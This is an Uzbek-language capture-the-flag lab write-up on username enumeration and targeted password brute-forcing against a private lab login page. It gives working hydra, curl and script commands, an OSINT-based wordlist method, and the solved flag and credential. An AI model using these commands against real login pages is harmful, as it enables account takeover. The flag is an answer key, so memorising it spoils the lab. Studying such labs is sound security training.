# 🎯 10 · Brute Force: Username Enumeration — yechim

**Status:** HAL QILINDI ✅
**Target:** `http://10.15.1.54:9010/`  (tavsifda `10.15.0.238:9010`)
**Credentials:** `s.rivera` : `Mochi2019!`
**FLAG:** `HTB{user_enum_378bc2a7e3861b7b}`
**Qoida:** faqat 9010 port.

## 🔎 Tasdiqlangan recon (lab javobi)
Login **username mavjudligini oshkor qiladi**:
- mavjud akkaunt, xato parol → `Incorrect password for that account.`
- yo'q akkaunt → `No account exists with username <code>...</code>.`

`/team` OSINT:
| Kim | Email (username) | OSINT |
|-----|------------------|-------|
| **Sofia Rivera** | `s.rivera@acme.io` | corgi **Mochi**, **2019**-da asrab olgan, **climbing** |
| Mark Doyle | `m.doyle@acme.io` | DevOps Lead |
| Admin Team | `admin@acme.io` | **out of reach** |

> Username formati: **birinchi-harf.familiya** → `s.rivera`, `m.doyle`.

**Crack uchun fail string:** `Incorrect password`.

## ✅ Topilgan credentials
```
s.rivera : Mochi2019!
```
Buyruq:
```bash
python3 brute.py --url http://10.15.1.54:9010/login \
    --login-page http://10.15.1.54:9010/ \
    --username s.rivera --wordlist /tmp/target.txt \
    --fail "Incorrect password" --threads 16
# [+] PASSWORD FOUND: Mochi2019!
```

## Flagni olish
Flag "Signed in" sahifasida (783 bayt). `brute.py` endi `HTB{...}` ni avtomatik
ko'rsatadi; qo'lda:
```bash
curl -s -X POST -d "username=s.rivera&password=Mochi2019!" \
     http://10.15.1.54:9010/login | grep -o 'HTB{[^}]*}'
```


---

## 1-qadam — Recon: `/team` (OSINT)
```bash
curl -s http://10.15.1.54:9010/team
# Ism/familiya, email (username), tug'ilgan kun, uy hayvoni, kompaniya ... yozib oling
curl -s http://10.15.1.54:9010/team | grep -oiE '[a-z0-9._%+-]+@[a-z0-9.-]+'
```

## 2-qadam — Username enumeration
Login **mavjud bo'lmagan** username uchun boshqa javob beradi (`Unknown username.`),
mavjud uchun esa `Incorrect password.`. Buni avtomatlashtirish — `enum_users.py`:

```bash
# nomzodlar ro'yxati (email local-part + umumiy nomlar)
printf 'admin\njdoe\nmroe\nroot\nuser\n' > /tmp/cand.txt

python3 enum_users.py --url http://10.15.1.54:9010/login \
                      --users /tmp/cand.txt --threads 10
# [+] valid usernames: jdoe, admin
```

Usul: har nomzod uchun **bir xil soxta parol** bilan POST qilinadi; javob
"known-invalid" baseline'idan farq qilsa (status/uzunlik/matn) → **username mavjud**.

## 3-qadam — Maqsadli wordlist (cupp-uslubida)
`/team`dan yig'ilgan OSINT bilan **`gen_wordlist.py`**:

```bash
python3 gen_wordlist.py --first John --last Doe --nick jd \
    --pet Sunshine --birthdate 1988-03-12 --company Acme \
    --leet --out /tmp/target.txt
# ~150k nomzod: ism/familiya/nick/pet + yil + !/@/# + leet
```

Yoki **cupp** bilan (interaktiv):
```bash
sudo apt-get install -y cupp
cupp -i        # so'ralgan maydonlarni /team OSINT bilan to'ldiring
```

## 4-qadam — O'sha bitta akkauntni crack
```bash
# hydra bilan:
hydra -l jdoe -P /tmp/target.txt -s 9010 -t 16 -f \
      10.15.1.54 http-post-form "/login:username=^USER^&password=^PASS^:F=Incorrect"

# yoki brute.py (flagni o'zi chiqaradi):
python3 brute.py --url http://10.15.1.54:9010/login \
                 --login-page http://10.15.1.54:9010/ \
                 --username jdoe --wordlist /tmp/target.txt \
                 --fail "Incorrect" --threads 16
```

> `F=Incorrect` — xato javob `Incorrect password.` matniga mos.
> (Admin paroli wordlist'da yo'q — u **out of reach**, behuda urinmang.)

## 5-qadam — Flag
`brute.py` muvaffaqiyatli javob body'sini ko'rsatadi (`evidence: ... HTB{...}`).
Yoki topilgan parol bilan qo'lda kirib oling.

## Bir buyruq bilan
```bash
FIRST=John LAST=Doe NICK=jd PET=Sunshine BIRTH=1988-03-12 ./getflag_enum.sh
# -> enum -> wordlist -> crack -> FLAG: HTB{...}
```

## Eslatmalar
- Maqsadli ro'yxat (~150k) butun rockyou'dan (14.3M) **~100× kichik** → daqiqalarda tugaydi.
- `gen_wordlist.py` qancha maydon bersangiz, shuncha aniq bo'ladi (yil, sherik, kompaniya, hobbi).
- `enum_users.py` da `--known-invalid` — albatta mavjud bo'lmagan username (baseline).
